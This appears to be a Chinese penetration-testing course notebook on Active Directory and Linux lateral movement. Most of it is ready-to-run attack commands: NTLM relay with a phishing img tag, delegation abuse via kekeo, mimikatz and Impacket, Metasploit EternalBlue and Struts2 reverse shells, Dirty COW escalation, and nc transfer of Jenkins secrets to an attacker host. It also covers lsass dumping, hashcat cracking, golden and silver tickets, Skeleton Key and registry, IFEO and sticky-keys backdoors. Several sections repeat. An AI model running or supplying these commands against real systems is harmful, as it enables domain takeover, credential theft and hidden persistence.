#横向移动-NTLM中继攻击-Inveigh嗅探-Hash破解
条件：被控主机当前管理员权限
Responder中继攻击-NTLM Hash破解
https://github.com/hashcat/hashcat/
https://github.com/Kevin-Robertson/Inveigh
1、监听拦截
Inveigh.exe
获取到的是NET NTLM HASH V1或V2
2、触发拦截
dir \\192.168.3.x\c$
2.1、钓鱼触发
http://192.168.3.31/1.html
<!DOCTYPE html>
<html>
<head>
  <title></title>
</head>
<body>
  <img src="file:///\\192.168.3.32\2">
</body>
</html>
3、破解密文
hashcat -m 5600 hash pass.txt --show

~~~



#### NTLM Inveigh嗅探



~~~
#横向移动-NTLM中继攻击-Inveigh嗅探-Hash破解
条件：被控主机当前管理员权限
Responder中继攻击-NTLM Hash破解
https://github.com/hashcat/hashcat/
https://github.com/Kevin-Robertson/Inveigh
1、监听拦截
Inveigh.exe
获取到的是NET NTLM HASH V1或V2
2、触发拦截
dir \\192.168.3.x\c$
2.1、钓鱼触发
http://192.168.3.31/1.html
<!DOCTYPE html>
<html>
<head>
  <title></title>
</head>
<body>
  <img src="file:///\\192.168.3.32\2">
</body>
</html>
3、破解密文
hashcat -m 5600 hash pass.txt --show

~~~



#### 委派攻击

~~~
#委派攻击分类：
1、非约束性委派
2、约束性委派
3、基于资源的约束性委派

#横向移动-原理利用-约束委派&非约束委派
-非约束委派
原理：
机器A（域控）访问具有非约束委派权限的机器B的服务，会把当前认证用户（域管用户）的的TGT放在ST票据中，一起发送给机器B，机器B会把TGT存储在lsass进程中以备下次重用。从而机器B就能使用这个TGT模拟认证用户（域管用户）访问服务。

利用场景
攻击者拿到了一台配置非约束委派的机器权限，可以诱导域管来访问该机器，然后得到管理员的TGT，从而模拟域管用户。

复现配置：
1、信任此计算机来委派任何服务
2、setspn -U -A priv/test batmanfuture

判断查询：
查询域内设置了非约束委派的服务账户：
AdFind -b "DC=god,DC=org" -f "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))" dn
查询域内设置了非约束委派的机器账户:
AdFind -b "DC=god,DC=org" -f "(&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))" dn
~~~

[![p9PEkJx.png](https://s1.ax1x.com/2023/04/17/p9PEkJx.png)](https://imgse.com/i/p9PEkJx)

[![p9PEAW6.png](https://s1.ax1x.com/2023/04/17/p9PEAW6.png)](https://imgse.com/i/p9PEAW6)查询域内设置了非约束委派的服务账户和非机器账户

[![p9PEVSK.png](https://s1.ax1x.com/2023/04/17/p9PEVSK.png)](https://imgse.com/i/p9PEVSK)







~~~
#委派攻击分类：
1、非约束性委派
2、约束性委派
3、基于资源的约束性委派

#横向移动-原理利用-约束委派&非约束委派
-非约束委派
原理：
机器A（域控）访问具有非约束委派权限的机器B的服务，会把当前认证用户（域管用户）的的TGT放在ST票据中，一起发送给机器B，机器B会把TGT存储在lsass进程中以备下次重用。从而机器B就能使用这个TGT模拟认证用户（域管用户）访问服务。

利用场景
攻击者拿到了一台配置非约束委派的机器权限，可以诱导域管来访问该机器，然后得到管理员的TGT，从而模拟域管用户。

复现配置：
1、信任此计算机来委派任何服务
2、setspn -U -A priv/test batmanfuture

判断查询：
查询域内设置了非约束委派的服务账户：
AdFind -b "DC=god,DC=org" -f "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))" dn
查询域内设置了非约束委派的机器账户:
AdFind -b "DC=god,DC=org" -f "(&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))" dn

利用步骤：
1、域控与委派机器通讯
主动：
net use \\webserver
钓鱼：
http://192.168.3.31/31.html
<!DOCTYPE html>
<html>
<head>
  <title></title>
</head>
<body>
  <img src="file:///\\192.168.3.31\2">
</body>
</html>
2、导出票据到本地
mimikatz sekurlsa::tickets /export
3、导入票据到内存
mimikatz kerberos::ptt [0;13da31]-2-0-60a00000-Administrator@krbtgt-GOD.ORG.kirbi
4、连接通讯域控
dir \\owa2010cn-god\c$

-约束委派
原理：
由于非约束委派的不安全性，微软在windows server 2003中引入了约束委派，对Kerberos协议进行了拓展，
引入了SService for User to Self (S4U2Self)和 Service for User to Proxy (S4U2proxy)。

利用场景：
如果攻击者控制了服务A的账号，并且服务A配置了到域控的CIFS服务的约束性委派。
则攻击者可以先使用S4u2seflt申请域管用户（administrator）访问A服务的ST1，
然后使用S4u2Proxy以administrator身份访问域控的CIFS服务，即相当于控制了域控。

复现配置：
1、机器设置仅信任此计算机指定服务-cifs
2、用户设置仅信任此计算机指定服务-cifs

判断查询：
查询机器用户（主机）配置约束委派
AdFind -b "DC=god,DC=org" -f "(&(samAccountType=805306369)(msds-allowedtodelegateto=*))" msds-allowedtodelegateto
查询服务账户（主机）配置约束委派
AdFind -b "DC=god,DC=org" -f "(&(samAccountType=805306368)(msds-allowedtodelegateto=*))" msds-allowedtodelegateto

利用步骤：
1、获取用户的票据
kekeo "tgt::ask /user:batmanfuture /domain:god.org /password::A@2000chusheng /ticket:administrator.kirbi" "exit"
kekeo "tgt::ask /user:webadmin /domain:god.org /NTLM:518b98ad4178a53695dc997aa02d455c /ticket:administrator.kirbi" "exit"
2、利用用户票据获取域控票据
kekeo "tgs::s4u /tgt:TGT_batmanfuture@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi /user:Administrator@god.org /service:cifs/owa" "exit"
kekeo "tgs::s4u /tgt:TGT_webadmin@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi /user:Administrator@god.org /service:cifs/owa2010cn-god.god.org" "exit"
3、导入票据到内存
mimikatz kerberos::ptt TGS_Administrator@god.org@GOD.ORG_cifs~owa2010cn-god.god.org@GOD.ORG.kirbi
4、连接通讯域控
shell dir \\owa2010cn-god.god.org\c$

#横向移动-实战靶机-约束委派&数据库攻防
从外网 Weblogic 打到内网，再到约束委派接管域控
-攻击Weblogic - CVE-2017-10271

-攻击域内成员主机 - MS17010
1、CS执行联动MSF
msf ip xxxx 
spawn msf
3、MSF监听联动配置
use exploit/multi/handler
set payload windows/meterpreter/reverse_http
set lhost 0.0.0.0
set lport xxxx
run
4、添加路由
run autoroute -p //查看当前路由表
run post/multi/manage/autoroute //添加当前路由表
5、利用模块
use exploit/windows/smb/ms17_010_eternalblue
set payload windows/x64/meterpreter/bind_tcp //正向连接上线
set rhost 10.10.20.7 //设置连接目标
set rhosts 10.10.20.7 //设置扫描目标
run

查找域内非约束委派用户和计算机：
AdFind.exe -h 10.10.10.8 -u saul -up admin!@#45 -b "DC=redteam,DC=red" -f "(&(samAccountType=805306368)(msds-allowedtodelegateto=*))" cn distinguishedName msds-allowedtodelegateto
信息收集加口令加漏洞探针：
fscan -h 10.10.10.18

-攻击域内数据库主机 - MSSQL+提权
Proxifier +  MDUT + 提权

-攻击域内域控主机 - 约束委派
1、kekeo请求获取sqlserver的TGT：kekeo "tgt::ask /user:sqlserver /domain:redteam.red /password:Server12345 /ticket:administrator.kirbi" "exit"
2、使用票据请求域控：kekeo "tgs::s4u /tgt:TGT_sqlserver@REDTEAM.RED_krbtgt~redteam.red@REDTEAM.RED.kirbi /user:Administrator@redteam.red /service:cifs/owa.redteam.red" "exit"
3、导入内存：mimikatz kerberos::ptt TGS_Administrator@redteam.red@REDTEAM.RED_cifs~owa.redteam.red@REDTEAM.RED.kirbi
4、连接域控：dir \\OWA\\c$

~~~





~~~
#横向移动-实战靶机-资源约束委派
基于资源的约束委派(RBCD)是在Windows Server 2012中新加入的功能，与传统的约束委派相比，它不再需要域管理员权限去设置相关属性。RBCD把设置委派的权限赋予了机器自身，既机器自己可以决定谁可以被委派来控制我。也就是说机器自身可以直接在自己账户上配置msDS-AllowedToActOnBehalfOfOtherIdentity属性来设置RBCD。

-》计算机加⼊域时，加⼊域的域⽤户被控后也将导致使用当前域用户加入的计算机受控。

条件：
1、域控Windows2012及以上
2、存在域内成员用户加入域操作

获取受害目标：有哪些域内计算机存在同一用户加入的
AdFind.exe -h 192.168.3.33 -b "DC=xiaodi,DC=local" -f "objectClass=computer" mS-DS-CreatorSID
判断受害用户：
sid2user.exe \\192.168.3.33 5 21 1695257952 3088263962 2055235443 1104

增加机器：
https://github.com/Kevin-Robertson/Powermad
Set-ExecutionPolicy Bypass -Scope Process
Import-Module .\Powermad.ps1
New-MachineAccount -MachineAccount serviceA -Password $(ConvertTo-SecureString "123456" -AsPlainText -Force)

获取sid：
https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1
Import-Module .\PowerView.ps1
Get-NetComputer serviceA -Properties objectsid
S-1-5-21-1695257952-3088263962-2055235443-1107

设置修改属性
powershell
Set-ExecutionPolicy Bypass -Scope Process
import-module .\powerview.ps1
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1695257952-3088263962-2055235443-1107)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer DATA| Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose

验证修改是否成功：
Get-DomainComputer DATA -Properties msds-allowedtoactonbehalfofotheridentity
清除修改设置：
Set-DomainObject DATA -Clear 'msds-allowedtoactonbehalfofotheridentity' -Verbose

连接目标获取票据：
python getST.py -dc-ip 192.168.3.33 xiaodi.local/serviceA\$:123456 -spn cifs/data.xiaodi.local -impersonate administrator
导入票据到内存：
mimikatz kerberos::ptc administrator.ccache
连接利用票据：
dir \\data.xiaodi.local\c$
python psexec.py -k xiaodi.local/administrator@data.xiaodi.local -no-pass

~~~



### Linux横向移动

~~~
#横向移动-Linux靶场-SSH协议&RSA密匙凭证
~/.ssh/config
~/.ssh/known_hosts
~/.bash_history
一般情况下SSH密钥存放在~/.ssh/目录下，也可以文件中搜索已保存的SSH凭证
grep -ir "BEGIN RSA PRIVATE KEY" /*
grep -ir "BEGIN DSA PRIVATE KEY" /*
grep -ir "BEGIN OPENSSH PRIVATE KEY" /*
参考：https://www.runoob.com/w3cnote/set-ssh-login-key.html

#横向移动-Linux靶场-提权&SSH&密匙&Jenkins等
1、Web DMZ权限获取
信息收集：
nmap 172.16.250.0/24
172.16.250.10 80开放
/struts2-showcase
利用漏洞：
msfconsole
use exploit/multi/http/struts2_content_type_ognl
set payload linux/x64/meterpreter/reverse_tcp
set rhosts 172.16.250.10
set lport 80
run
权限提升：
curl https://raw.githubusercontent.com/sqlnetcat/dirtycow-mem/master/dirtycow-mem.c
upload /root/dirtycow-mem.c /tmp
shell
gcc -Wall -o dirtycow-mem dirtycow-mem.c -ldl -lpthread
python3 -c "import pty;pty.spawn('/bin/bash')"
./dirtycow-mem
持续稳定：
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
echo 1 > /proc/sys/kernel/panic && echo 1 > /proc/sys/kernel/panic_on_oops && echo 1 > /proc/sys/kernel/panic_on_unrecovered_nmi && echo 1 > /proc/sys/kernel/panic_on_io_nmi && echo 1 > /proc/sys/kernel/panic_on_warn
横向移动：
/opt/tomcat/webapps/kittens/WEB-INF/config/opencms.properties
cat ~/.bash_history
cp ~/.ssh/id_rsa /tmp/id_rsa
chmod 777 id_rsa
download  /tmp/id_rsa /root/id_rsa
chmod 0600 id_rsa
ssh -i id_rsa root@172.16.250.30

2、Jenkins DMZ权限获取
信息收集：
getuid
netstat -anpt
172.16.250.30 8080开放
建立节点：
use auxiliary/server/socks_proxy
vim /etc/proxychains4.conf
172.16.250.30 8080开放 jenkins服务
攻击Jenkins：
nc -lvp 1234 > master.key
nc -lvp 1234 > hudson.util.Secret
nc -lvp 1234 > credentials.xml
nc 172.16.250.128 1234 < /home/jenkins/secrets/hudson.util.Secret
nc 172.16.250.128 1234 < /home/jenkins/secrets/master.key
nc 172.16.250.128 1234 < /home/jenkins/credentials.xml
破解密匙：
https://github.com/cheetz/jenkins-decrypt
python decrypt.py master.key hudson.util.Secret credentials.xml

3、Database DMZ权限获取
密码横向：
ssh db_backup@172.16.250.50
)uDvra{4UL^;r?*h
权限提升：
getuid
sudo su

~~~

### 明文获取

~~~
注意:
1、Windows-Mimikatz适用环境：
微软为了防止明文密码泄露发布了补丁KB2871997，关闭了Wdigest功能。
当系统为win10或2012R2以上时，默认在内存缓存中禁止保存明文密码，
此时可以通过修改注册表的方式抓取明文，但需要用户重新登录后才能成功抓取。
2、Linux-mimipenguin适用环境：
Kali 4.3.0 (rolling) x64 (gdm3)
Ubuntu Desktop 12.04 LTS x64 (Gnome Keyring 3.18.3-0ubuntu2)
Ubuntu Desktop 16.04 LTS x64 (Gnome Keyring 3.18.3-0ubuntu2)
XUbuntu Desktop 16.04 x64 (Gnome Keyring 3.18.3-0ubuntu2)
VSFTPd 3.0.3-8+b1 (Active FTP client connections)
Apache2 2.4.25-3 (Active/Old HTTP BASIC AUTH Sessions) 
openssh-server 1:7.3p1-1 (Active SSH connections - sudo usage)

所以出现以下：
0、Windows-强开
1、正面刚密文-Hashcat
2、侧面找思路-RDP保存&SSH密匙

#Linux-密码获取-内存读取&密文破解&存储凭证
1、密码读取：
https://github.com/huntergregal/mimipenguin
chmod 755 ./mimipenguin.sh
./mimipenguin.sh

2、密码破解：
cat /etc/shadow
hashcat.exe -a 3 -m 1800 linuxhash.txt pass.txt
加密形式：
linux sha512crypt $6$, SHA512 (Unix)加密方式：
hashcat -m 1800 sha512linux.txt p.txt
linux sha256crypt $5$, SHA256 (Unix)加密方式：
hashcat -m 7400 sha256linux.txt p.txt
linux下md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)加密方式：
hashcat -m 500 linuxmd5.txt p.txt
inux下bcrypt $2*$, Blowfish加密方式：
hashcat -m 3200 linuxmd5.txt p.txt

3、密码存储：SSH密匙-上节课知识点

#Windows-密码获取-在线离线读取&密文破解&存储凭证
1、在线读
https://github.com/gentilkiwi/mimikatz
mimikatz.exe "privilege::debug" "log" "sekurlsa::logonpasswords"

2、离线读
https://learn.microsoft.com/zh-cn/sysinternals/downloads/procdump
实验1：针对防护拦截(Mimikatz被拦截)
Procdump是微软官方的工具，可在命令行将lsass导出且杀软不会拦截
Procdump.exe -accepteula -ma lsass.exe lsass.dmp
mimikatz.exe "sekurlsa::minidump lsass.DMP"
sekurlsa::logonPasswords full
实验2：针对高版本但有存储(内存还有数据的)
Procdump.exe -accepteula -ma lsass.exe lsass.dmp
mimikatz.exe "sekurlsa::minidump lsass.DMP"
sekurlsa::logonPasswords full

3、解决高版本
修改注册表+强制锁屏+等待系统管理员重新登录+截取明文密码
修改注册表来让Wdigest Auth保存明文口令方式
reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\ /v UseLogonCredential /t REG_DWORD /d 1

4、HASH破解
https://hashcat.net/
https://www.cmd5.com/
https://www.somd5.com/
hashcat cmd5 somd5
518b98ad4178a53695dc997aa02d455c
https://www.cnblogs.com/Junglezt/p/16044372.html
-m 密文类型
-a 破解类型
?l 小写
?s 符号
?d 数字
字典破解：
.\hashcat.exe -a 0 -m 1000 .\hash.txt .\pass.txt
暴力破解：
hashcat.exe -a 3 -m 1000 518b98ad4178a53695dc997aa02d455c ?l?l?l?l?l?s?s?s?d?d

5、RDP凭据抓取   
查看连接记录：
cmdkey /list
查找本地的Credentials：
dir /a %userprofile%\appdata\local\microsoft\credentials\*
Credentials记录guidMasterKey值:
mimikatz dpapi::cred /in:C:\Users\webadmin\appdata\local\microsoft\credentials\5FBB2585F99BA05366F08E52F1C1740B
找到guidMasterKey对应的MasterKey:
mimikatz sekurlsa::dpapi
解密指定的MasterKey凭据：
mimikatz dpapi::cred /in:C:\Users\webadmin\appdata\local\microsoft\credentials\5FBB2585F99BA05366F08E52F1C1740B /masterkey:f70e1a641096f1b63731d571b43b33aaf009f6af5a3352504e6ddb3cd158f17eec2d541f18b8289ebf547d871dfb257a6bbbd5232550eb6f26a06d39378da4a5

~~~



### 权限维持

#### 域控权限维持

###### SSP

###### HOOK

###### Skeleton Key

###### DSRM

~~~
参考资料：
https://www.cnblogs.com/lcxblogs/p/14216525.html

#内网域-权限维持-基于验证DLL加载-SSP
方法一：但如果域控制器重启，被注入内存的伪造的SSP将会丢失。
privilege::debug
misc::memssp
C:\Windows\System32\mimilsa.log 记录登录的账号密码
方法二：使用此方法即使系统重启，也不会影响到持久化的效果。
1、mimilib.dll 传到目标域控的c:\windows\system32\目录下
2、修改注册表，重启生效
reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v "Security Packages" /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib" /t REG_MULTI_SZ
c:\windows\system32\kiwissp.log 记录账号密码文件
技术总结：
攻防实战中，靶机很难会重启，攻击者重启的话风险过大，
因此可以在靶机上把两个方法相互结合起来使用效果比较好，
尝试利用把生成的日志密码文件发送到内网被控机器或者临时邮箱。

#内网域-权限维持-基于验证DLL加载-HOOK
https://github.com/wh0Nsq/HookPasswordChange
https://github.com/clymb3r/Misc-Windows-Hacking
方法一、
powershell
Import-Module .\Invoke-ReflectivePEInjection.ps1
Invoke-ReflectivePEInjection -PEPath HookPasswordChange.dll -procname lsass
方法二、
powershell -exec bypass -Command "& {Import-Module 'C:\Invoke-ReflectivePEInjection.ps1';Invoke-ReflectivePEInjection -PEPath C:\HookPasswordChange.dll -procname lsass}"
报错解决：
powershell
Set-ExecutionPolicy
unrestricted

#内网域-权限维持-基于机制账号启用-DSRM
1.获取dsrm及krbtgt的NTLM hash
privilege::debug
lsadump::lsa /patch /name:krbtgt
token::elevate
lsadump::sam
2.dsrm&krbtgt&NTLM hash同步
NTDSUTIL：打开ntdsutil
set DSRM password：修改DSRM的密码
sync from domain account 域用户名字：使DSRM的密码和指定域用户的密码同步
q(第1次)：退出DSRM密码设置模式
q(第2次)：退出ntdsutil
3.修改dsrm登录方式
New-ItemProperty "hklm:\system\currentcontrolset\control\lsa\" -name "dsrmadminlogonbehavior" -value 2 -propertyType DWORD
4.利用PTH传递攻击
privilege::debug
sekurlsa::pth /domain:owa2010cn-god /user:administrator /ntlm:b097d7ed97495408e1537f706c357fc5
dir \\owa2010cn-god\c$
技术总结：
利用系统自带机制模式DSRM，修改DSRM默认登录方式和属性，通过其同步krgtgt进行PTH攻击，实现持续化控制，但适用于系统=>windows server2008。每个域控制器都有本地管理员账号和密码（与域管理员账号和密码不同）。DSRM账号可以作为一个域控制器的本地管理员用户，通过网络连接域控制器，进而控制域控制器。

#内网域-权限维持-基于用户属性修改-SID history
1、获取某用户SID属性：
Import-Module ActiveDirectory
Get-ADUser webadmin -Properties sidhistory
2、给予某用户administrator属性：
privilege::debug
sid::patch
sid::add /sam:webadmin /new:administrator
3、测评给与前后的DC访问权限：
dir \\192.168.3.21\c$
技术总结：
把域控管理员的SID加入到 其他某个 恶意的域账户的SID History中，然后，这个恶意的（我们自己创建的）域账户就可以域管理员权限访问域控了，不修改域账户一直存在。

#内网域-权限维持-基于登录进程劫持-Skeleton Key
1、测试域内某个用户与DC通讯
dir \\owa2010cn-god\c$
2、连接DC后，DC注入lsass进程
net use \\192.168.3.21\ipc$ "Admin12345" /user:god\administrator
mimikatz：
privilege::debug
misc::skeleton
3、重新测试域内某个用户与DC通讯
net use \\owa2010cn-god\ipc$ "mimikatz" /user:god\administrator
dir \\owa2010cn-god\c$
技术总结：
因为Skeleton Key技术是被注入到lsass.exe进程的，
所以它只存在内存中，如域控重启，万能密码将失效。

~~~

![image.png](https://img12.360buyimg.com/ddimg/jfs/t1/89918/28/34759/21959/64817111F876cefc3/60901559f0df4b70.jpg)

~~~
1.权限维持-基于用户-隐藏用户
https://github.com/wgpsec/CreateHiddenAccount
CreateHiddenAccount -u xiaodi -p Xiaodi!@#45
控制面板能查看到，命令查看看不到，单机版无法删除，域环境可以删除



2.基于软件-GotoHTTP&RustDesk
C2 GotoHTTP
https://gotohttp.com/goto/download.12x
无网络（1、压根没有网络，2、限制出网）
1、有网络，无限制
2、有网络，有限制（不限制https就可以）
3、无网络，有限制（不限制https就可以）
利用场景：有网络下，需要绕过杀毒等网络防护
B2C模式，无需安装控制端软件，有浏览器就可以远控。
流量走https协议，只要目标放行443端口出口就可以实现内网穿透。
在低带宽也可以使用，运行占用内存极低，控制时占用CPU仅为0%-3%。
被控端在类Linux系统上支持图形界面（GUI）和字符界面（CLI）。
网络唤醒远程主机需加载驱动，导致运行时安全卫士会拦截这行为，其他杀软不会拦截。

C2 RustDesk
https://github.com/rustdesk/rustdesk
利用场景：无需网络，需要绕过杀毒等网络防护
1、有网连接：
C:\Users\用户名\AppData\Roaming\RustDesk\config
其中ID和密码在RustDesk.toml文件里。
2、无网内网连接：IP直连
RustDesk2.toml
direct-server = 'Y'
direct-access-port = '8443'


3.权限维持-基于服务TGT-黄金白银票据
⻩⾦票据⽣成攻击，是⽣成有效的TGT Kerberos票据，并且不受TGT⽣命周期的影响（TGT默认10⼩时，最多续订7天），这⾥可以为任意⽤户⽣成⻩⾦票据，然后为域管理员⽣成TGT，这样普通⽤户就可以变成域管理员。
白银票据（SILVER TICKET）是利用域的服务账户进行伪造的ST，在Kerberos认证的第三步，Client带着ST和Authenticator3向Server上的某个服务进行请求，Server接收到Client的请求之后，通过自己的Master Key 解密ST，从而获得 Session Key。所以只需要知道Server用户的Hash就可以伪造出一个ST，且不会经过KDC，但是伪造的门票只对部分服务起作用（不需要交互KDC，需要知道Server的NTLM Hash）。

黄金方法：
1、已经拿下域管理员，获取到krbtgt hash；
2、利用krbtgt的hash制作黄金票据工具，进行攻击。
流程：
1、域名：god.org
2、域的SID值：S-1-5-21-1218902331-2157346161-1782232778
>whoami /user
>whoami /all
>wmic useraccount get name,sid
3、域的KRBTGT账户NTLM-HASH：b097d7ed97495408e1537f706c357fc5
>mimikatz privilege::debug
>mimikatz lsadump::lsa /patch
4、伪造用户名：webadmin（任意用户名）
生成票据：
mimikatz kerberos::golden /user:webadmin /domain:god.org /sid:S-1-5-21-1218902331-2157346161-1782232778 /krbtgt:b097d7ed97495408e1537f706c357fc5 /ticket:g
导入内存：
mimikatz kerberos::ptt g
访问测试：
dir \\owa2010cn-god\c$
后期渗透：结合前面的课程
net use \\owa2010cn-god
黄金票据总结：
该攻击⽅式其实是⼀种后⻔的形式，属于第⼆次进⾏攻击的⽅法。
第⼀次拿到域管权限之后，需要将krbtgt NTLM hash进⾏保存，当第⼆次再来进⾏域渗透攻击时，我们就可使⽤krbtgt的NTLM hash制作⻩⾦票据，从⽽再次获得域管权限。

白银方法：
1、已经拿下域管理员，获取到DC hash；
2、利用DC的hash制作白银票据工具，进行攻击。
流程：
1、域名：god.org
2、域的SID值：S-1-5-21-1218902331-2157346161-1782232778
>whoami /user
>whoami /all
>wmic useraccount get name,sid
3、域DC账户NTLM-HASH：82779569ef27d72b88b6c93dd8b37299
>mimikatz privilege::debug
>mimikatz sekurlsa::logonpasswords
4、伪造用户名：webadmin（任意用户名）
导入票据：（CIFS文件共享服务）
domain：域名
sid：域环境下的SID，除去最后-的部分剩下的内容
target：要访问的服务器，写FQDN
rc4：写的是目标主机的NTLM（主机名$对应NTLM）
service：要访问的资源类型
user：伪造的用户
cifs：共享文件
mimikatz kerberos::golden /user:webadmin /domain:god.org /sid:S-1-5-21-1218902331-2157346161-1782232778 /target:owa2010cn-god /service:cifs /rc4:82779569ef27d72b88b6c93dd8b37299 /ptt
白银票据总结
1、伪造的ST，只能访问指定的服务，如CIFS；
2、不与KDC交互，直接访问Server；
3、ST由服务账号 NTLM Hash 加密。
~~~



~~~
#权限维持-域环境&单机版-自启动
1、自启动路径加载
C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\
2、自启动服务加载
sc create ServiceTest binPath= C:\xd.exe  start= auto
sc delete ServiceTest
3、自启动注册表加载
-当前用户键值
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run 
-服务器键值（需要管理员权限）
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run 
-添加启动项
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "backdoor" /t REG_SZ /F /D "C:\xd.exe"
4、计划计时任务
参考前面横向移动课程

#权限维持-域环境&单机版-粘滞键
系统自带的辅助功能进行替换执行，放大镜，旁白，屏幕键盘等均可。
粘滞键位置：
c:\windows\system32\sethc.exe
move sethc.exe sethc1.exe
copy cmd.exe sethc.exe

#权限维持-域环境&单机版-映像劫持
测试：执行notepad成cmd
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v debugger /t REG_SZ /d "C:\Windows\System32\cmd.exe /c calc"
配合GlobalFlag隐藏：执行正常关闭后触发
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /d "C:\xd.exe"

#权限维持-域环境&单机版-屏保&登录
1、WinLogon配合无文件落地上线
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /V "Userinit" /t REG_SZ /F /D "C:\xd.exe"
2、屏幕保护生效后执行后门
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v SCRNSAVE.EXE /t REG_SZ /d "C:\xd.exe" /f

~~~













### NTLM协议 + Kerberos协议

##### NTLM协议

流程如下：

1）客户端向服务端发送用户名等信息

2）服务端收到后使用登录用户名对应的NTLM hash加密challenge（16位随机字符）

3）服务端再将这个challenge返回给客户端

4）客户端收到challenge后，将要登录账户对应的HTML hash加密这个challenge得到Response，然后发送给服务端

5）服务端再比对这个Response和challenge-1是否相等，相等则通过



![image.png](https://img12.360buyimg.com/ddimg/jfs/t1/149210/18/33468/11505/6480704dF5a6a7117/8b243469e953be28.jpg)

##### Kerberos协议

客户端client，服务端server，域控KDC-DC上的

流程如下：

1）客户端向Kerberos服务请求，希望获取访问服务端的权限。Kerberos得到这个消息之后，判断客户端是否可信赖（AS来判断），是可信赖的就返回TGT给客户端

2）客户端得到了TGT之后，继续向Kerberos请求，希望获取访问服务端的权限，Kerberos判断TGT是否正确，如果正确则给客户端访问服务端的权限ticket（TGS给予）

3）客户端得到了ticket之后，访问服务端，这个ticket只是针对这个服务端，如果你要访问其他的服务端，则你需要重新申请TGT之后再得到ticket

![image.png](https://img10.360buyimg.com/ddimg/jfs/t1/82950/19/25574/21013/6480733dF2828e718/f5cee9047abc8208.jpg)

### 白银票据

特点：

1）不需要与KDC进行交互

2）需要目标服务的NTLM hash

在第三步认证中的Ticket组成：

~~~php
Ticket = Server Hash(Server Session Key + Client info + End Time)
~~~

当我们拥有这个`Server Hash`，即客户端的NTLM hash，我们就可以伪造一个不需要KDC进行验证的Ticket，而这个`Server Session Key`，服务器不知道Server Session Key在未发送Ticket前，服务端不知道Server Session Key是什么

由于白银票据需要目标服务器的NTLM hash，所以没用办法得到域内所有机器的票据，所以作用就是只能对服务器上的某些服务进行伪造

![Screenshot_20230607_202336.jpg](https://img12.360buyimg.com/ddimg/jfs/t1/220738/37/28092/38678/648076dcFb0300fab/371eb22887dc3aeb.jpg)

###### 防御：

开启PAC（Privileged Attribute Certificate）特权属性证书保护功能，主要作用就是将票据发送给Kerberos服务，由Kerberos服务验证票据是否有效





### 黄金票据

特点：

1）需要与DC通信

2）需要krbtgt用户的hash（即KDC hash，可以KDC）

如果我们得到了KDC hash，我们就可以自己伪造任意的TGT，从而向TGS发送访问任意服务器的Ticket









### 信息收集

当系统为win10或2012以上时，默认在Wdigest内存中禁止保存明文密码(hash可以抓到)

[![qIaLSe.png](https://s1.ax1x.com/2022/04/02/qIaLSe.png)](https://imgtu.com/i/qIaLSe)

##### 域环境判断和域控定位

~~~shell
#	是否存在域：
1	ipconfig /all
2	net view /domain	#	如果加载出来了那么说明有域环境
3	net config workstation	#	登录信息，会显示是工作组还是域环境
~~~

[![qI0uzF.png](https://s1.ax1x.com/2022/04/02/qI0uzF.png)](https://imgtu.com/i/qI0uzF)

[![qI0NRO.png](https://s1.ax1x.com/2022/04/02/qI0NRO.png)](https://imgtu.com/i/qI0NRO)

[![qI07F0.png](https://s1.ax1x.com/2022/04/02/qI07F0.png)](https://imgtu.com/i/qI07F0)

[![qI0gW8.jpg](https://s1.ax1x.com/2022/04/02/qI0gW8.jpg)](https://imgtu.com/i/qI0gW8)

[![qIBST1.png](https://s1.ax1x.com/2022/04/02/qIBST1.png)](https://imgtu.com/i/qIBST1)

~~~shell
#	域控定位：
net time /domain		#	这是因为域环境内的时间统一是根据域控的时间为准
nslookup 			#	追踪地址，找到域控的IP地址

dns服务器开放53端口，而dns服务器通常都在域控上，所以我们扫存活主机，再扫端口，找到开放53端口的主机IP地址
域控的名字通常是DC，DC-control，者是域名子域名类型(比如是baidu.com)，其他的是fanyi.baidu.com
域控有Kerberos协议开放88端口
~~~

[![qIBklD.png](https://s1.ax1x.com/2022/04/02/qIBklD.png)](https://imgtu.com/i/qIBklD)

[![qIBFSO.jpg](https://s1.ax1x.com/2022/04/02/qIBFSO.jpg)](https://imgtu.com/i/qIBFSO)

~~~shell
#	相关用户收集操作命令
收集这些是为了后期密码攻击
whoami /all #	查看当前用户权限
net user 	#	查看本地用户
net user /domain #	查看域用户信息
net group /domain #	获取域用户组信息
wmic useraccount get /all 				#	涉及域用户详细信息
net group "Domain Admins" /domain 		#	查询域管理员账户
